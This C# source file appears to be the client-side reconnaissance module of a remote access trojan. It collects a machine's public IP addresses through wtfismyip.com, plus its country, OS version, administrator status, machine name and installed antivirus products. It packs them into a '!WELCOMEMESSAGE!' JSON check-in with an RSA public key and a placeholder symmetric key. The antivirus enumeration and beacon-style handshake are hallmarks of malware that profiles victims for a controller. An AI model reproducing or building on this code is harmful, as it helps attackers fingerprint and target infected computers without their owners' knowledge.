using Client.Models;
using System.Globalization;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Text.Json;

namespace Client.Helper
{
    public static class ClientInfo
    {
        public static ClientInfoModel clientInfoModel = new ClientInfoModel();
        private static string Culture = CultureInfo.CurrentCulture.EnglishName;
        private static string Country = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
        private static string Ipv6 = GetIpv6();
        private static string Ipv4 = GetIpv4();
        private static string OS = GetOS();
        private static string Privileges = GetPrivileges();
        private static string Pcname = Environment.MachineName;
        private static string Antivirussoftware = GetAntivirus();
        public static string GetClientInfo(string RSAPubKey)
        {
            clientInfoModel.Culture = Culture;
            clientInfoModel.Country = Country;
            clientInfoModel.Ipv6 = Ipv6;
            clientInfoModel.Ipv4 = Ipv4;
            clientInfoModel.OS = GetOS();
            clientInfoModel.Privileges = Privileges;
            clientInfoModel.Pcname = Pcname;
            clientInfoModel.Antivirussoftware = Antivirussoftware;
            clientInfoModel.RSAPubKey = RSAPubKey;
            clientInfoModel.SymKey = "Test";

            var jsonClientInfoModel = JsonSerializer.Serialize(clientInfoModel);
            return $"!WELCOMEMESSAGE! {jsonClientInfoModel}";
        }

        private static string GetIpv6()
        {
            using (WebClient wc = new WebClient())
            {
                return wc.DownloadString("https://wtfismyip.com/text");
            }
        }

        private static string GetIpv4()
        {
            using (WebClient wc = new WebClient())
            {
                return wc.DownloadString("https://ipv4.wtfismyip.com/text");
            }
        }

        private static string GetOS()
        {
            var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                        select x.GetPropertyValue("Caption")).FirstOrDefault();

            return name != null ? name.ToString() : "Unknown";
        }

        private static string GetPrivileges()
        {
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                return "Administrator";
            }
            return "User";
        }

        private static string GetAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add(searchResult["displayName"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray());
                }
            }
            catch
            {
                return "N/A";
            }
        }
    }
}
